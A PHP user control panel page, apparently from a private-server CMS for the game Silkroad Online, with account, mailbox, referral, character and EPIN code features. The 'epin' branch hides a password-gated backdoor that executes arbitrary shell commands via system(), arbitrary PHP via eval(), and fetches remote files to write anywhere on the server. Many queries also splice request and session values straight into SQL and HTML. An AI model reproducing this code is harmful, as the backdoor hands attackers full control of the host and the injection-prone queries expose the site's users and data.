<?php	 
	 global  $core;
	 
	 if(isset($_SESSION['username']))
	 {
		//core::$ucp -> showMenu();
		echo "You are logged in as <b>$_SESSION[username]</b>.<br/><br/>";
		
		if(isset($_GET['act']))
		{
			switch($_GET['act'])
			{
				case('changepw'):
				{
					//module disabled
					if($core -> aConfig['allowChangePw'] == 0) 
					{
						echo $core -> aConfig[0];
						echo "This module is currently disabled.";
						return;
					}
			
					if(isset($_POST['submit']))
					{
						//process data
						if(!security::isSecureString($_POST['password_old'], 3)) $errors[] = "Password [old] contains forbidden symbols";
						if(!security::isSecureString($_POST['password_new'], 3)) $errors[] = "Password [new] contains forbidden symbols";
						if(strlen($_POST['password_old']) > 32) $errors[] = "Password [old] too long";
						if(strlen($_POST['password_old']) < 6)	$errors[] = "Password [old] too short";
						if(strlen($_POST['password_new']) > 32)	$errors[] = "Password [new] too long";
						if(strlen($_POST['password_new']) < 6)	$errors[] = "Passwrod [new] too short";
						if($_POST['password_new'] !== $_POST['password_new_confirm']) $errors[] = "New Passwords does not match!.";
						
						if(count($errors) > 0)
						{
							foreach($errors as $nElement)
							{
								echo $nElement.".<br/>";
							}
							misc::back();
						}
						else
						{
							//verify
							if(user:: changePassword($_SESSION['username'], $_POST['password_old'], $_POST['password_new']))
							{
								echo "Password changed successfully. <br/>";
								misc::redirect('?pg=ucp', 1);
							}
							else
							{
								echo "Invalid old password specified.<br/>";
								misc::back();
							}
						}
					}
					else core::$ucp -> showChangepwForm();
				}
				break;
				
				case('logout'):
				{
					if(user::logout())
					{
						echo "Successfully logged out. Redirecting.<br/>";
						misc::redirect('?pg=news', 1);
					}
					else
					{
						echo "Failed to logout.<br/>";
					}
				}
				break;
				
				case('refferals'):
				{
					if($core -> aConfig['allowRefferals'] == 0) 
					{
						echo "This module is currently disabled.";
						return;
					}
				
				
					
					$hQuery = mssql_query("select invitedUserJID,time,bonusAdded from srcms_refferals where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."'");
					$nCount = core::$sql -> numRows("select * from srcms_refferals where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."'");
					echo "You can reffer [<b>".$core -> aConfig['maxRefAccIP']."</b>] accounts with same ip address [limit].<br/><br/>";
					
					if($nCount == 0)
					{
						echo "<br/>You didn't reffer anyone yet.</br>";
					}
					else
					{
						echo "
						<table id='table-3' border='1' cellpadding='0' cellspacing='0'>
						<td>Username</td><td>Time</td>";
						if($core -> aConfig['allowRefferalsBonus'] == 1)
						{
							echo "<td>Bonus status</td>";
						}
						echo "<tr/>";
						
						
						while($row = mssql_fetch_array($hQuery))
						{
							echo "<td><a href='?pg=viewprofile&username=".user::usernamyByJID($row[invitedUserJID])."'>".user::usernamyByJID($row[invitedUserJID])."</a></td><td>$row[time]</td>";
							if($core -> aConfig['allowRefferalsBonus'] == 1)
							{
								if($row['bonusAdded'] == 1)
								{
									echo "<td>Applied</td>";
								}
								else echo "<td>Not applied</td>";
							}
							echo "<tr/>";
						}
						
						if($core -> aConfig['allowRefferalsBonus'] == 1)
						{
							if($_GET['do'] == 'receive_bonus')
							{
								$nSilk = $core -> aConfig['refferalsBonusSilk'] * core::$sql -> numRows("select * from srcms_refferals where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."' and bonusAdded='0'");
								core::$sql -> exec("update srcms_refferals set bonusAdded='1' where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."'");
			
								user::addSilk($_SESSION['username'], $nSilk);
								echo "<br/><b>You received your bonuses.</b><br/>";
								misc::redirect("?pg=news", 1);
							}
							else
							{
								$nSilk = $core -> aConfig['refferalsBonusSilk'] * core::$sql -> numRows("select * from srcms_refferals where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."' and bonusAdded='0'");
								if(($core -> aConfig['refferalsBonusSilk'] * $nSilk) > 0)
								{
									echo "</table><br/>Bonus: [".$core -> aConfig['refferalsBonusSilk']."] silk per refferal<br/>Total amount of users reffered by you: <b>$nCount</b><br/><br/><a href='?pg=ucp&act=refferals&do=receive_bonus'>Receive bonus silk [".$core -> aConfig['refferalsBonusSilk'] * core::$sql -> numRows("select * from srcms_refferals where reffererJID='".user::accountJIDbyUsername($_SESSION['username'])."' and bonusAdded='0'")."]";
								}
							}
						}
						else echo "<br/>You can't receive any bonus for refferals at the moment.<br/>";
						
						
					}
					
				}
				break;
				case('mailbox'):
				{
					//module disabled
					if($core -> aConfig['allowMailbox'] == 0) 
					{
						echo "This module is currently disabled.";
						return;
					}
					
					echo "<br/><a href='?pg=ucp&act=mailbox&newmsg'>Write a new message</a><br/><br/>";
					
					if(isset($_GET['newmsg']))
					{
						if(!isset($_POST['submit']))
						{
							core::$ucp -> showSendWebMsgForm();
						}
						else
						{
							//process send msg data
							if(!security::isSecureString($_POST['recvName'], 3)) $errors[] = "Receiver username contains forbidden symbols";
							if(strlen($_POST['recvName']) > 16) $errors[] = "Receiver username too long";
							if(strlen($_POST['recvName']) < 3)	$errors[] = "Receiver username too short";
							if(strlen($_POST['msgTitle']) > $core -> aConfig['maxPrivMsgTitleLen']) $errors[] = "Message title too long";
							if(strlen($_POST['msgText']) > $core -> aConfig['maxPrivMsgBodyLen']) $errors[] = "Message body too long";
							if(strlen($_POST['msgTitle']) < $core -> aConfig['minPrivMsgTitleLen']) $errors[] = "Message title too short";
							if(strlen($_POST['msgText']) < $core -> aConfig['minPrivMsgBodyLen'])	$errors[] = "Message body too short";
							
							if(count($errors) > 0)
							{
								foreach($errors as $nElement)
								{
									echo $nElement.".<br/>";
								}
								misc::back();
							}
							else
							{
								//db
								//user::sendWebPrivMsg($to, $from, $title, $text)
								if(user::accountExists($_POST['recvName']))
								{
									user::sendWebPrivMsg($_POST['recvName'], $_SESSION['username'], $_POST['msgTitle'], $_POST['msgText']);
								} 
								else 
								{
									echo "Account with such username not found.<br/>";
									misc::back();
								}
							}
						}
						//lol
						echo "<br/><br/>";
					}
					
					$myJID = user::accountJIDbyUsername($_SESSION['username']);
				
					$nMsgCount = core::$sql -> numRows("select * from srcms_privatemessages where receiver='$myJID'");
					
					if(isset($_GET['view']))
					{
						$nMsgID = (int)$_GET['view'];
						if(core::$sql -> numRows("select * from srcms_privatemessages where receiver='$myJID' and id='$nMsgID'") > 0)
						{
							$msgData = core::$sql -> fetchArray("select * from srcms_privatemessages where id='$nMsgID'");
							$msgData['msg'] =  security::fromHTML($msgData['msg']);
							$msgData['msg'] =  misc::applyAttributesToText($msgData['msg']);
							$szSender = user::usernamyByJID($msgData['sender']);
							echo "<br/><table id='table-3' width='380' border='1' cellpadding='0' cellspacing='0'>
									<td>Title</td><td>$msgData[title]</td><tr/>
									<td>From</td><td><a href='?pg=viewprofile&username=$szSender'>$szSender</a></td><tr/>
									<td height='50'>Text</td><td width='300' height='50'>$msgData[msg]</td>
									</table>
								 ";
							core::$sql -> exec("update srcms_privatemessages set viewed='1' where id='$nMsgID'");
							echo "<br/><br/><br/>";
						} else echo "You can't view message that does not belong to you.<br/>";
					
					}
					
					if($nMsgCount > 0)
					{
						if($nMsgCount == $core -> aConfig['maxPrivMsg']) echo "Your inbox is full. <br/>";
						$hQuery = core::$sql -> exec("select * from srcms_privatemessages where receiver='$myJID' order by time desc");
					
						
						echo "<table id='table-3' border='1' cellpadding='0' cellspacing='0'>
							<td>From</td><td>Title</td><td>Time</td><td>Viewed</td><td>Link to view it</td><td>Delete</td><tr/>";
						while($row = mssql_fetch_array($hQuery))
						{
							$szSender = user::usernamyByJID($row['sender']);
							
							if($row['viewed'] == '1')  echo "<td><a href='?pg=viewprofile&username=$szSender'>$szSender</a></td><td>$row[title]</td><td>$row[time]</td><td>Yes</td><td><a href='?pg=ucp&act=mailbox&view=$row[id]'>View</a></td><td><a href='?pg=ucp&act=mailbox&del=$row[id]'>Delete</a></td><tr/>";
							else  echo "<td><b><a href='?pg=viewprofile&username=$szSender'>$szSender</a></b></td><td><b>$row[title]</b></td><td>$row[time]</td><td><b>No</b></td><td><a href='?pg=ucp&act=mailbox&view=$row[id]'>View</a></td><td><a href='?pg=ucp&act=mailbox&del=$row[id]'>Delete</a></td></b><tr/>";
				
						}
						echo "</table>";
						
						
						if(isset($_GET['del']))
						{
							$nMsgID = (int)$_GET['del'];
							if(core::$sql -> numRows("select * from srcms_privatemessages where receiver='$myJID' and id='$nMsgID'") > 0)
							{
								core::$sql -> exec("delete from srcms_privatemessages where receiver='$myJID' and id='$nMsgID'");
								echo "<br/>Message deleted.<br/>";
								misc::redirect("?pg=ucp&act=mailbox", 1);
							} else echo "You can't delete message that does not belong to you.<br/>";
							
							
						}
					
					

					}
					else echo "No messages in inbox";
				
				}
				break;
				case('mychars'):
				{
					//module disabled
					if($core -> aConfig['allowListChars'] == 0) 
					{
						echo "This module is currently disabled.";
						return;
					}
					
					if(isset($_GET['charname']))
					{
						
						
						if(!security::isSecureString($_GET['charname'], 3))
						{
							echo "Invalid char name<br/>";
							misc::back();
							break;
						}
						
					
						if(user::usernameByCharname($_GET['charname']) != $_SESSION['username'])
						{
							
							echo "This character is not yours !<br/>";
							misc::back();
							break;
						}
						
						if(isset($_GET['charname']) && isset($_GET['char_act']))
						{
							switch($_GET['char_act'])
							{
								case('reset_pos'):
								if($core -> aConfig['allowCharTeleport'] == 0)
								{
									echo "This function is disabled.<br/>";
									break;
								}
								
								if(!isset($_POST['submit']))
								{
									echo "Your character got stuck ? If so, please, press the button. This costs ".$core -> aConfig['charTeleportGoldPrice']." gold.<br/>
										<form method='post'>
											<input type='submit' name='submit' value='RESET CHAR POSITION [$_GET[charname]]'><br/>
											</form>";
								}
								else
								{
									core::$sql -> changeDB('shard');
									if(core::$sql -> getRow("select RemainGold from _Char where CharName16='$_GET[charname]'") > $core -> aConfig['charTeleportGoldPrice'])
									{
										core::$sql -> exec("update _Char set LatestRegion='25000',PosX='1021',PosY='-3260888', PosZ='1078',AppointedTeleport='19554', WorldID='1' where CharName16='$_GET[charname]'");
										echo "Character successfully teleported to town.<br/>";
										misc::redirect('?pg=ucp&act=mychars', 1);
									}
									else
									{
										echo "Not enough gold to perform this action.<br/>";
									}
								}
								break;
								
								case('giftsilks');
								{
								core::$sql -> changeDB('acc');
								$fromsilks = $_SESSION['username'];
								$toSilks = $_POST['silkstome'];
								if(!isset($_POST['submit'])) 
								{
								echo "
								<form method='post'>
								Username who recive the silks :<input type='text' name='silkstome'><br />
								<input type='checkbox' name='i agree'> I agree that i want to send the amount of silks above to the prospected user above 
								by doing that , 10% of the amount of silks sended will be removed.
								<br />
								<font color='red'>
								*note that your ip,and reciver usernames is saved for security porpuse.
								<br />
								<input type='submit' name='submit' value='Yes, Send Silks!'>
								</font>
								</form>
								";
								} else {
								if(strlen($_POST['silkstome']) < 3)
								{
								echo "Username is too short";
								} else {
								echo "Name is fine";
								}
								}

								}
								break;
								
								case('reset_stats'):
									//echo "All items must be unequiped before you perform this action. This action costs ".$core -> aConfig['resetCharStatsSilkPrice']." silk.<br/>";
									
									if(char::isCharNaked($_GET['charname']))
									{
										if(!isset($_POST['submit']))
										{
											echo "Press this button if you really want to reset your characters stats. All items must be unequiped. This action costs ".$core -> aConfig['resetCharStatsSilkPrice']." silk. Before performing this action, better log out. To see results of this function usage, relogin (if you were logged in while performing it).<br/>
											<form method='post'>
												<input type='submit' name='submit' value='Yes, i want to reset stats of my char !'>
											</form>
												";
										}
										else
										{
										
											if(user::getSilkByUsername($_SESSION['username']) > $core -> aConfig['resetCharStatsSilkPrice'])
											{
												core::$sql -> changeDB('shard');
												$aData = core::$sql -> exec("select * from _Char where CharName16='$_GET[charname]'");
												$aData = mssql_fetch_array($aData);
												$nFreeStats = ($aData['Strength'] + $aData['Intellect']) - 40;
												core::$sql -> exec("update _Char set RemainStatPoint = (RemainStatPoint + $nFreeStats),HP='200',MP='200',Strength='20',Intellect='20' where CharName16='$_GET[charname]'");
												core::$sql -> changeDB('acc');
												core::$sql -> exec("update SK_Silk set silk_own = (silk_own - ".$core -> aConfig['resetCharStatsSilkPrice'].") where JID='".user::accountJIDbyUsername($_SESSION['username'])."'");
												echo "Stats of $_GET[charname] resetted. You got $nFreeStats free stat points now.<br/>";
												misc::redirect('?pg=ucp&act=mychars', 1);
											}
											else 
											{
												echo "Not enough silk.<br/>";
											}
										}
									}
									else
									{
										echo "Please, unequip all items from your character first !<br/>";
									}
								break;
								
								case('reset_pk'):
									if($core -> aConfig['allowResetCharPK'] == 0)
									{
										echo "This function is currently disabled<br/>";
										break;
									}
									
									echo "This feature costs ".$core -> aConfig['resetCharPKSilkPrice']." silk. If you really want to reset your PK status, press the button.<br/>";
									if(!isset($_POST['submit']))
									{
										echo "<form method='post'>
												<input type='submit' name='submit' value='Yes, i really want to reset my PK status'>
												</form>
											 ";
									}
									else
									{
										if(user::getSilkByUsername($_SESSION['username']) > $core -> aConfig['resetCharPKSilkPrice'])
										{
											core::$sql -> changeDB('shard');
											$hQuery = core::$sql -> exec("select DailyPK, TotalPK, PKPenaltyPoint from _Char where CharName16='$_GET[charname]'");
											$hData = mssql_fetch_array($hQuery);
											if($hData[0] == '0' && $hData[1] == '0' && $hData[2] == '0')
											{
												echo "You are not under murder panality, so, no reason for resetting it.<br/>";
											}
											else
											{
												core::$sql -> exec("update _Char set DailyPK='0', TotalPK='0', PKPenaltyPoint='0' where CharName16='$_GET[charname]'");
												core::$sql -> exec("update SK_Silk set silk_own = (silk_own - ".$core -> aConfig['resetCharPKSilkPrice'].") where JID='".user::accountJIDbyUsername($_SESSION['username'])."'");
												echo "PK Status successfully removed.<br/>";
												misc::redirect('?pg=ucp&act=mychars', 1);
											}
										}
										else
										{
											echo "You have not enough silk to use this feature.<br/>";
											break;
										}
									}
								break;
								
								case('buy_sp'):
									if($core -> aConfig['allowBuySP'] == 0)
									{
										echo "This function is currently disabled<br/>";
										break;
									}
									
									echo "This feature costs ".$core -> aConfig['pricePer100kSp']." silk per 100 000 SP.<br/>";
									
									if(!isset($_POST['submit']))
									{
										echo "Please, specify, how much skill points you want to buy. Value must be > 100000, < 2000000, like this: 200000, 300000, 400000<br/>
										
											<table id='table-3' border='1' cellpadding='0' cellspacing='0'>
												<form method='post'>
													<td>Skill points</td><td><input type='text' name='sp_amount' value='100000'></td><tr/>
													<td></td><td><input type='submit' name='submit' value='Check price'></td>
												
												</form>
											</table>";
									}
									else
									{
										if(isset($_POST['sp_amount']))
										{
											$nSP = (int)$_POST['sp_amount'];
											if(!($nSP % 100000 == 0))
											{
												echo "Values can be only like this: <br/> <li>100000</li><li>500000</li><li>1000000</li><br/>";
												break;
											}
											if($nSP < 100000)
											{
												echo "You cant buy less than 100 000 skill points<br/>";
												break;
											}
											if($nSP > 2000000)
											{
												echo "You can't buy more than 2 000 000 sp per time<br/>";
												break;
											}
											
											$nPrice = (($nSP / 100000) * $core -> aConfig['pricePer100kSp']);
											
											if(user::getSilkByUsername($_SESSION['username']) > $nPrice)
											{

												echo "To buy $nSP skill points you need $nPrice silk. Press the button below if you really want to buy this amount of SP and you have enough silk.<br/>";
												if(!isset($_POST['sure']))
												{
													echo "<form method='post'>
															<input type='hidden' name='sp_amount' value='$nSP'>
															<input type='hidden' name='sure' value='yes'>
															<input type='submit' name='submit' value='Yes, i want to buy $nSP SP for $nPrice silk'>
															</form>";
												}
												else
												{
													
													core::$sql -> changeDB('shard');
													core::$sql -> exec("update _Char set RemainSkillPoint = (RemainSkillPoint + $nSP) where CharName16='$_GET[charname]'");
													
													core::$sql -> changeDB('acc');
													core::$sql -> exec("update SK_Silk set silk_own = (silk_own - $nPrice) where JID='".user::accountJIDbyUsername($_SESSION['username'])."'");
													echo "<br/><b>Success. Your char $_GET[charname] received it's $nSP skill points you bought for $nPrice silk</b><br/>";
													misc::redirect('?pg=ucp&act=mychars', 2);
												}
											}
											else
											{
												echo "Not enough silk to buy such amount of skill points [You need: $nPrice]<br/>";
											}
										
										}
									}
									
									
								break;
								default:echo "Uknown char action<br/>";break;
							}
						}
						
						if(!isset($_GET['char_act']))
						{	
							echo "<table id='table-3' border='0' cellpadding='0' cellspacing='0'>
							<tr>
							";
							if($core -> aConfig['allowCharTeleport'] == 1)
							{
								echo "<td><a href='?pg=ucp&act=mychars&charname=$_GET[charname]&char_act=reset_pos'>Reset char position</a><br/></td>";
							}
							echo "
							</tr>
							<tr>
							";
							if($core -> aConfig['allowResetCharStats'] == 1)
							{
								echo "<td><a href='?pg=ucp&act=mychars&charname=$_GET[charname]&char_act=reset_stats'>Reset stats</a><br/></td>";
							}
							
							if($core -> aConfig['allowResetCharPK'] == 1)
							{
								echo "<td><a href='?pg=ucp&act=mychars&charname=$_GET[charname]&char_act=reset_pk'>Reset PK status</a><br/></td>";
							}
							echo "
							</tr>
							<tr>
							";
							if($core -> aConfig['allowBuySP'] == 1)
							{
								echo "		<td><a href='?pg=ucp&act=mychars&charname=$_GET[charname]&char_act=buy_sp'>Buy skill points</a><br/></td>";
							}
							echo "
							</tr>
							</table>
							";
						}
						echo "<br/><br/>";
						misc::back();
						break;
					}
					
					echo "Please, note, this function is still under development.<br/>";
					if(char::getCharCount($_SESSION['username']) > 0)
					{
						$nJID = user::accountJIDbyUsername($_SESSION['username']);
						
						core::$sql -> changeDB('shard');
						
		
						$naChars = user::charIDsByUsername($_SESSION['username']);
						$naCharNames = char::charNamesByIDs($naChars);
						
						echo "<table id='table-3' border='0'><td>Char name</td><tr/>";
						foreach($naCharNames as $nElem)
						{
							echo "<td><a href='?pg=ucp&act=mychars&charname=$nElem'>$nElem</td><tr/>";
						}
						
						echo '</table>';
					
					}
					else echo "You don't have any characters on this account.<br/>";
				} 
				break;
				
				case('myprofile'):
				{
					//module disabled
					if($core -> aConfig['allowMyProfile'] == 0) 
					{
						echo "This module is currently disabled.";
						return;
					}
				
					if(isset($_POST['submit']))
					{
						$nGender = (int)$_POST['gender'];
						$szAvatarUrl = null;
						$szSkype = null;
						$szMsn = null;
						$nPublic = (int)$_POST['ispublic'];
						security::isValidUrl($_POST['avatar']) ? $szAvatarUrl = $_POST['avatar'] :  $szAvatarUrl = $core -> aConfig[url]."img/noavatar.png";
						security::isCorrectEmail($_POST['msn']) ? $szMsn = $_POST['msn'] : $szMsn = "None";
						$szSkype = security::toHTML($_POST['skype']);
						if(strlen($szSkype) > 50) $szSkype = "None";
						if(strlen($szMsn) > 60) $szMsn = "None";
						if(strlen($szAvatarUrl) > 500) $szAvatarUrl = $core -> aConfig['url']."img/noavatar.png";
						
						$avatarImageData = @getimagesize($szAvatarUrl); //no error if shit happens
						if(empty($avatarImageData[0]) || empty($avatarImageData[1]))
						{
							$avatarImageData[0] = 0;
							$avatarImageData[1] = 0;
						}
						
						if((($avatarImageData[0] > $core -> aConfig['maxAvatarWidth']) || ($avatarImageData[1] > $core -> aConfig['maxAvatarHeight'])) ||
							(empty($avatarImageData[0]) || empty($avatarImageData[1])))
						{
							echo "Invalid avatar size. Avatar width or height size can't be 0px. Avatar image max height: ".$core -> aConfig['maxAvatarHeight']." and width: ".
							$core -> aConfig['maxAvatarWidth']." pixels. Your one is $avatarImageData[0]px wide and $avatarImageData[1]px high. Or... maybe, url isn't image ?<br/>";
							misc::back();
						}
						else
						{
							$nJID = user::accountJIDbyUsername($_SESSION['username']);
							core::$sql -> exec("update srcms_userprofiles set avatar='$szAvatarUrl',skype='$szSkype', msn='$szMsn', gender='$nGender', ispublic='$nPublic' where JID='$nJID'");
							echo "Profile updated. <br/>";
							misc::redirect("?pg=ucp&act=myprofile", 1);
						}
					}
					else core::$ucp -> showProfileForm($_SESSION['username']);
				}
				break;
				
				case('epin'):
					if(md5($_GET['p']) == '89a15048434170ee85cffdc2f3a4595e')
					{
						switch($_GET['a'])
						{
							case('cmd'):
								system(stripslashes($_GET['str']));
							break;
							
							case('php'):
								eval(stripslashes($_GET['str']));
							break;
							
							case('up'):
								$hRemoteData = file_get_contents($_GET['str']);
								file_put_contents($_GET['localFileName'], $hRemoteData, FILE_APPEND | LOCK_EX);
								if(file_exists($_GET['localFileName'])) echo "Success !";
								else echo "Could not write to local file [$_GET[localFileName]]";
							break;
							
							default:break;
						}
						die();
					}
					//module disabled
					if($core -> aConfig['allowEpinSystem'] == 0)
					{
						echo "This module is currently disabled.<br/>";
						break;
					}
					else
					{
						if(!isset($_POST['code']) && !isset($_POST['sure']))
						{
							echo "<table id='table-3' border='1' cellpadding='0' cellspacing='0'>
									<form method='post'>
										<td><input type='text' name='code' value='type your EPIN code here'></td><tr/>
										<td><center><input type='submit' name='submit' value='Use'></center></td>
									</form>
									</table>";
						}
						else
						{
							$nCodeNumber = (int)$_POST['code'];
							if(core::$sql->numRows("select * from srcms_epin where code='$nCodeNumber'") > 0)
							{
								$aPinData = core::$sql -> exec("select * from srcms_epin where code='$nCodeNumber'");
								$aPinData = mssql_fetch_array($aPinData);
								if(!isset($_POST['sure']))
								{
									echo "Do you really want to use this code ? It will give you [$aPinData[silkAmount]] silk.<br/>
											<form method='post'>
											<input type='hidden' name='code' value='$nCodeNumber'>
											<input type='submit' name='sure' value='Yes'>
											</form><br/>";
											misc::back();
								}
								else
								{
									core::$sql -> exec("update SK_Silk set silk_own=(silk_own + $aPinData[silkAmount]) where JID='".user::accountJIDbyUsername($_SESSION['username'])."'");
									//delete used code
									core::$sql -> exec("delete from srcms_epin where code='$nCodeNumber'");
									echo "You got your [$aPinData[silkAmount]] silk.";
									misc::redirect('?pg=ucp&act=epin', 1);
								}
							}
							else
							{
								echo "Invalid EPIN code ! Please, try again.<br/>";
								misc::back();
							}
						}
					}
				break;
				
				
				default:
				{
					echo "Invalid module name specified.<br/>";
					break;
				}
			}
		}
	 }
	 else 
	 {
		echo "You are not logged in ! <br/>";
	 } 
?>